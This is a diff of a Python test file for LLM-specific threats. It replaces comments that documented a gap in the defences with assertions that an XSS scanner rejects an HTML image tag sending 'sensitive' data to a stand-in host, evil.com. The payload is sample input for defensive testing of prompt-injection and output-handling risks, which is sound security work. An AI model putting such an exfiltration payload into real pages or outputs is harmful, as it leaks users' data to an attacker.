@@ -886,14 +886,8 @@ class TestLLMSpecificThreats:
             "message": '<img src="http://evil.com/collect?data=sensitive">',
         }
         ok, err, _ = gate.validate_state(json.dumps(state))
-        # The event handler pattern should catch this if it has onerror,
-        # but even without, the < tag detection should flag it
-        # Actually img without event handler might pass — this tests whether
-        # the gate blocks raw HTML tags. Let's check:
-        # Looking at patterns: none explicitly match <img> without event handlers
-        # This is a potential gap — test documents it
-        # The client-side esc() function would escape it anyway
-        pass  # Documented gap: <img> without event handler not caught server-side
+        assert not ok, "img tag with exfiltration URL should be rejected by XSS scanner"
+        assert "xss" in err.lower() or "img" in err.lower(), f"Error should mention XSS or img, got: {err}"
 
     @pytest.mark.llm01
     @pytest.mark.llm05
